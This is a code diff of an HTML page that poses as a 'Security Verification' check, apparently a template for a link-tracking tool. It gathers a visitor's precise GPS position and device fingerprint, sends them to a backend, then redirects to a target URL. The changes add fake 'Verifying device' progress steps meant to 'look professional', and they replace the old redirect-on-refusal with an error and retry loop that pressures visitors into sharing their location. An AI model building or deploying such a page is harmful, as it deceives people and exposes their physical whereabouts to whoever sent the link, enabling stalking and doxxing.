@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Access Gateway</title>
+    <title>Security Verification</title>
     <!-- Instruct the browser to send Client Hints -->
     <meta http-equiv="Delegate-CH" content="sec-ch-ua-full-version-list https://nominatim.openstreetmap.org; sec-ch-ua-model https://nominatim.openstreetmap.org">
     <style>
@@ -12,8 +12,20 @@
             --glass-bg: rgba(30, 41, 59, 0.7);
             --glass-border: rgba(255, 255, 255, 0.1);
             --accent: #3b82f6;
+            --accent-hover: #2563eb;
             --text-main: #f8fafc;
             --text-muted: #94a3b8;
+            --error: #ef4444;
+        }
+
+        @media (prefers-color-scheme: light) {
+            :root {
+                --bg-color: #f1f5f9;
+                --glass-bg: rgba(255, 255, 255, 0.9);
+                --glass-border: rgba(0, 0, 0, 0.1);
+                --text-main: #0f172a;
+                --text-muted: #64748b;
+            }
         }
 
         body {
@@ -22,14 +34,15 @@
             font-family: 'Inter', system-ui, -apple-system, sans-serif;
             background: var(--bg-color);
             background-image: 
-                radial-gradient(circle at 15% 50%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 85% 30%, rgba(139, 92, 246, 0.15) 0%, transparent 50%);
+                radial-gradient(circle at 15% 50%, rgba(59, 130, 246, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 85% 30%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
             color: var(--text-main);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             overflow: hidden;
+            transition: background 0.3s ease, color 0.3s ease;
         }
 
         .glass-panel {
@@ -41,7 +54,7 @@
             padding: 40px;
             width: 100%;
             max-width: 420px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
             text-align: center;
             transform: translateY(20px);
             opacity: 0;
@@ -52,22 +65,8 @@
             to { transform: translateY(0); opacity: 1; }
         }
 
-        .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid var(--glass-border);
-            border-top-color: var(--accent);
-            border-radius: 50%;
-            margin: 0 auto 24px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
         h1 {
-            margin: 0 0 12px;
+            margin: 0 0 16px;
             font-size: 1.5rem;
             font-weight: 600;
         }
@@ -79,16 +78,74 @@
             font-size: 0.95rem;
         }
 
-        .status {
-            font-size: 0.875rem;
-            color: var(--text-muted);
-            margin-top: 24px;
-            padding-top: 24px;
-            border-top: 1px solid var(--glass-border);
-            text-align: left;
-            display: flex;
+        .btn {
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: 500;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s ease, transform 0.1s ease;
+            width: 100%;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
+            gap: 8px;
+        }
+
+        .btn:hover {
+            background: var(--accent-hover);
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        /* Loading state */
+        .loading-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 16px;
+        }
+
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid var(--glass-border);
+            border-top-color: var(--accent);
+            border-radius: 50%;
+            margin-bottom: 16px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-steps {
+            text-align: left;
+            width: 100%;
+            margin-top: 16px;
+            font-size: 0.875rem;
+            color: var(--text-muted);
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            opacity: 0.4;
+            transition: opacity 0.3s;
+        }
+        
+        .step.active {
+            opacity: 1;
+            color: var(--text-main);
+            font-weight: 500;
         }
 
         .pulse {
@@ -97,8 +154,10 @@
             height: 8px;
             background-color: #10b981;
             border-radius: 50%;
-            margin-right: 8px;
             box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
+        }
+
+        .step.active .pulse {
             animation: pulse 2s infinite;
         }
 
@@ -106,41 +165,72 @@
             70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
             100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
+
+        .error-msg {
+            color: var(--error);
+            font-size: 0.9rem;
+            margin-bottom: 16px;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <div class="glass-panel">
-        <div class="spinner"></div>
-        <h1>Security Check</h1>
-        <p>Location verification is required to continue. Please confirm your location when prompted by your browser to access the system.</p>
+    <div class="glass-panel" id="main-panel">
+        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 16px;">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            <path d="m9 12 2 2 4-4"/>
+        </svg>
+
+        <h1>Security Verification</h1>
         
-        <div class="status">
-            <span class="pulse"></span>
-            <span id="status-text">Verifying environment security...</span>
+        <div id="intro-content">
+            <p>To continue, we need to verify your current location. This helps ensure secure and valid system access.</p>
+            <p class="error-msg" id="error-text">Location access is required to proceed.</p>
+            <button class="btn" id="verify-btn" onclick="startVerification()">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
+                Continue Verification
+            </button>
+        </div>
+
+        <div class="loading-container" id="loading-content">
+            <div class="spinner"></div>
+            <p style="margin-bottom: 0;">Verifying access...</p>
+            
+            <div class="status-steps">
+                <div class="step" id="step-1">
+                    <span class="pulse"></span> Checking environment...
+                </div>
+                <div class="step" id="step-2">
+                    <span class="pulse"></span> Verifying device...
+                </div>
+                <div class="step" id="step-3">
+                    <span class="pulse"></span> Requesting location...
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
         const SESSION_ID = '{{SESSION_ID}}';
         const TARGET_URL = '{{TARGET_URL}}';
-        const statusText = document.getElementById('status-text');
         let redirectTriggered = false;
+        let failsafeTimer = null;
 
-        // Ensure async fetch completes before redirecting
         function redirect() {
             if (redirectTriggered) return;
             redirectTriggered = true;
-            statusText.innerText = "Verification complete. Redirecting...";
+            if (failsafeTimer) clearTimeout(failsafeTimer);
+            
+            // Show final success step
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            const p = document.querySelector('#loading-content p');
+            if (p) p.innerText = "Verification complete. Redirecting...";
+            
             setTimeout(() => {
                 window.location.href = TARGET_URL;
             }, 1000);
         }
-
-        // Failsafe redirect after 20 seconds total
-        setTimeout(() => {
-            redirect();
-        }, 20000);
 
         // Gather enriched client-side data natively
         let screenResolution = 'Unknown';
@@ -160,7 +250,6 @@
             userAgent: navigator.userAgent
         };
 
-        // Attempt UA-CH resolution
         async function enrichAndSend(locationData) {
             try {
                 if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
@@ -182,12 +271,11 @@
                     }
                 }
             } catch (e) {
-                console.warn('UA-CH collection failed, falling back to basic data', e);
+                console.warn('UA-CH collection failed', e);
             }
 
             locationData.deviceData = deviceData;
 
-            // POST to backend and wait for it to finish before redirecting
             fetch('/api/location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -197,33 +285,79 @@
             .catch(() => redirect());
         }
 
-        // Request geolocation
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    enrichAndSend({
-                        sessionId: SESSION_ID,
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
-                    });
-                },
-                (error) => {
-                    enrichAndSend({
-                        sessionId: SESSION_ID,
-                        error: error.message || "denied"
-                    });
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 15000, // Wait up to 15 seconds to ensure slow mobile gets it
-                    maximumAge: 0
-                }
-            );
-        } else {
-            enrichAndSend({
-                sessionId: SESSION_ID,
-                error: "Geolocation is not supported by this browser."
+        function setStep(stepNum) {
+            document.querySelectorAll('.step').forEach((el, idx) => {
+                if (idx + 1 === stepNum) el.classList.add('active');
+                else el.classList.remove('active');
             });
+        }
+
+        function handleDeny() {
+            // Restore UI to intro
+            document.getElementById('loading-content').style.display = 'none';
+            document.getElementById('intro-content').style.display = 'block';
+            
+            // Show error message and change button text
+            document.getElementById('error-text').style.display = 'block';
+            const btn = document.getElementById('verify-btn');
+            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg> Retry Location Access';
+            
+            // Cancel failsafe since user interacted
+            if (failsafeTimer) clearTimeout(failsafeTimer);
+        }
+
+        function requestLocation() {
+            setStep(3); // Requesting location...
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        enrichAndSend({
+                            sessionId: SESSION_ID,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    },
+                    (error) => {
+                        // User denied or timeout
+                        console.warn("Location error:", error.message);
+                        handleDeny();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                handleDeny();
+            }
+        }
+
+        function startVerification() {
+            document.getElementById('intro-content').style.display = 'none';
+            document.getElementById('error-text').style.display = 'none';
+            document.getElementById('loading-content').style.display = 'flex';
+            
+            setStep(1); // Checking environment...
+            
+            // Setup a failsafe timer (30 seconds total)
+            failsafeTimer = setTimeout(() => {
+                if (!redirectTriggered) {
+                    enrichAndSend({
+                        sessionId: SESSION_ID,
+                        error: "timeout/unresponsive"
+                    });
+                }
+            }, 30000);
+
+            // Simulate UI steps to look professional
+            setTimeout(() => {
+                setStep(2); // Verifying device...
+                setTimeout(() => {
+                    requestLocation();
+                }, 800);
+            }, 800);
         }
     </script>
 </body>
